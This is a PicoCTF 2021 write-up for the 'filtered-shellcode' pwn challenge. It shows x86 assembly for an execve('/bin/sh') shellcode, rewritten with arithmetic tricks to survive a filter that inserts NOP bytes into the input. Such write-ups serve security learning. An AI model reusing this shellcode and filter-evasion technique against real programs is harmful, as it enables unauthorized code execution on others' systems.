# PicoCTF 2021, filtered-shellcode, pwn

## Description

A program that just runs the code you give it? That seems kinda boring...

## Solution

This one was funny :D
We send our bytecode and crackme will run it but... every two bytes adds two 0x90 bytes (NOP's) so we cannot really use instructions longer than two bytes because binary will screw it up. Okay, so let's use this shellcode:

```assembly
xor eax, eax
push eax
; /bin/sh
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
mov    ecx, eax
mov    edx, eax
xor    eax, eax
mov    al, 0xb
int    0x80

;exit
xor    eax, eax
inc    eax
int    0x80
```

But how to do two times push (or mov) with 4-byte value? We have to make use of additional bytes and do arithmetic transformations on it to achieve our values!

Building 0x68732f2f in eax register

```assembly
; bulding first part of string
mov eax, 0x90906814

nop
mov ecx, 0x90900096
nop
xor ecx, 0x90900090

dec_loop1:
sub eax, 0x9090012e
nop
loop dec_loop1-6
nop

; eax = 0x5f2d2f00
;       0x68732f2f   <- target

nop
xor eax, 0x909011bf
xor eax, 0x909026ce

; eax = 0x68732f2f
push eax
nop
```

Building 0x6e69622f in eax register

```assembly
; building second part of the string
mov eax, 0x90906e00

nop
mov ecx, 0x90900082
nop
xor ecx, 0x90900090

dec_loop:
sub eax, 0x909000b9
nop
loop dec_loop-6

; eax = 0x646662fe
;       0x6e69622f    <- target

nop
xor eax, 0x9090019f
xor eax, 0x90900b41

nop
push eax
```

Now we can finish our shellcode as normal and pop the shell.

Note: during competition I didn't notice that character 0xA is 'banned' due to input reading method :) yes, it cost	 ~40 minutes of debugging 

Solve script: [go.py](./go.py)

Shellcode: [test.asm](./test.asm)
